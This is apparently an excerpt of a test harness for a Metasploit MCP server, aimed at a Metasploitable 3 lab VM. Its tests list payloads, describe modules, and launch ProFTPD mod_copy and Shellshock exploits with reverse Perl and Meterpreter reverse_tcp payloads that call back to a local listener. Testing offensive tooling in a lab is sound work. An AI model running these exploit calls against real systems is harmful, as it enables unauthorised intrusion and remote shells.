...
class MetasploitMCPTestClient:
    ...
    def __init__(self, mcp_url: str = "http://127.0.0.1:5555/mcp", use_gateway: bool = False):
        ...
        tools_config = {"metasploit": {"url": self.mcp_url, "transport": "streamable_http"}}
...
class ComprehensiveToolTester:
    ...
    async def test_list_payloads_proftpd_debug(self) -> TestResult:
        ...
        try:
            result1 = await self.mcp_client.call_tool(
                "list_payloads", {"exploit_module": exploit_module}
            )
        ...
        try:
            result2 = await self.mcp_client.call_tool(
                "list_payloads", {"exploit_module": exploit_module, "platform": "unix"}
            )
        ...
        try:
            result3 = await self.mcp_client.call_tool(
                "list_payloads", {"exploit_module": exploit_module, "platform": "linux"}
            )
        ...
        try:
            result4 = await self.mcp_client.call_tool(
                "list_payloads",
                {"exploit_module": exploit_module, "platform": "unix", "arch": "x86"},
            )
            ...
            test_results.append(
                ("Platform=unix, Arch=x86", count4, raw4 if isinstance(raw4, list) else [])
            )
        except Exception as e:
            logger.error(f"  Error: {e}")
        ...
        try:
            result5 = await self.mcp_client.call_tool(
                "list_payloads",
                {"exploit_module": exploit_module, "platform": "linux", "arch": "x86"},
            )
            ...
            test_results.append(
                ("Platform=linux, Arch=x86", count5, raw5 if isinstance(raw5, list) else [])
            )
        except Exception as e:
            logger.error(f"  Error: {e}")
        ...
        try:
            result6 = await self.mcp_client.call_tool(
                "list_payloads", {"exploit_module": exploit_module, "arch": "x86"}
            )
        ...
        return TestResult(
            ...
            message=message,
            duration_seconds=duration,
            details={"test_results": test_results, "baseline_count": baseline_count},
        )
    ...
    async def test_describe_module_exploit(self) -> TestResult:
        ...
        return await self._run_test(
            ...
            tool_args={"module_name": "unix/ftp/proftpd_modcopy_exec", "module_type": "exploit"},
    ...
    async def test_describe_module_payload(self) -> TestResult:
        ...
        return await self._run_test(
            ...
            tool_args={"module_name": "cmd/unix/reverse_perl", "module_type": "payload"},
            expected_status="success",
            validate_fn=validate,
        )
    ...
    async def test_describe_module_auxiliary(self) -> TestResult:
        ...
        return await self._run_test(
            ...
            tool_args={"module_name": "scanner/ftp/ftp_version", "module_type": "auxiliary"},
            expected_status="success",
            validate_fn=validate,
        )
    ...
    async def test_run_auxiliary_module_invalid_module(self) -> TestResult:
        ...
        def validate(result):
            ...
            return (
                False,
                f"Expected error for invalid module, got: {result.get('status')} - {result.get('message', '')}",
            )
    ...
    async def test_run_auxiliary_module_failed_to_load(self) -> TestResult:
        ...
        def validate(result):
            ...
            return (
                False,
                f"Expected error for failed module load, got: {result.get('status')} - {result.get('message', '')}",
            )
    ...
    async def test_run_exploit_failed_to_load(self) -> TestResult:
        ...
        def validate(result):
            ...
            if result.get("status") == "error":
                ...
                if (
                    "failed to load" in msg
                    or "failed to load" in output
                    or "failed to load" in check_output
                ):
                    return True, "Early exit detected 'Failed to load module' error"
                # Also accept "not found" as valid validation
                if "not found" in msg:
    ...
    async def test_list_listeners_initial(self) -> TestResult:
        ...
        def validate(result):
            if result.get("status") == "success":
                return (
                    True,
                    f"Handlers: {result.get('handler_count', 0)}, Other: {result.get('other_job_count', 0)}",
                )
    ...
    async def test_run_exploit_rpc_job_mode(self) -> TestResult:
        ...
        return await self._run_test(
            ...
            tool_args={
                ...
                "payload_options": {"LHOST": self.lhost, "LPORT": self.lport},
                "run_as_job": True,
    ...
    async def test_terminate_session(self) -> TestResult:
        ...
        result = await self._run_test(
            ...
            tool_args={"session_id": self.current_session_id, "kill_associated_job": True},
            expected_status="success",
            validate_fn=validate,
        )
    ...
    async def test_additional_exploit_shellshock(self) -> TestResult:
        ...
        return await self._run_test(
            ...
            tool_args={
                ...
                "payload_name": "linux/x86/meterpreter/reverse_tcp",
                "payload_options": {"LHOST": self.lhost, "LPORT": self.lport + 200},
                "run_as_job": False,
                "timeout_seconds": 120,
            },
            expected_status="success",
        ...
        for session_id in sessions.keys():
            try:
                await self.mcp_client.call_tool(
                    "terminate_session",
                    {"session_id": int(session_id), "kill_associated_job": True},
                )
            except Exception as e:
    ...
    def print_summary(self):
        ...
        for result in self.results:
            ...
            logger.info(
                f"{status_icon} [{result.status.value:7}] {result.tool_name}: {result.test_name}"
            )
            logger.info(
                f"           Duration: {result.duration_seconds:.2f}s | {result.message[:60]}"
            )
...
Examples:
  ...
  poetry run python scripts/comprehensive_tool_test.py --target 10.0.2.15 --lhost 10.0.2.4 --verbose
    ...
    parser.add_argument(
        "--target", required=True, help="Target IP address (e.g., Metasploitable 3)"
    )
    parser.add_argument("--lhost", required=True, help="Local IP address for reverse connections")
    parser.add_argument(
        "--lport",
        type=int,
        default=4444,
